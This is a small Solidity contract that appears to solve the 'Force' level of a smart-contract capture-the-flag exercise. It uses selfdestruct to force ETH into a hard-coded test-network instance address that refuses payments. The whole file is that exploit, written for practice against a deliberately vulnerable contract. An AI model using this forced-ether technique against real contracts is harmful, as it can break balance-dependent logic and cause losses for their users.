// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// import {ITelephone} from "./ITelephone.sol";

contract ForceSolution {
  // https://goerli-optimism.etherscan.io/address/0xe23924D99B2ADeE5d6643eE7635d44e447886CFb
  address private forceInstanceAddress = 0xe7D4FcE6416df4D25e95396d310B89563D9B31f0;

  constructor() {}

  receive() external payable {}

  function forceETH() external {
    selfdestruct(payable(forceInstanceAddress));
  }
}
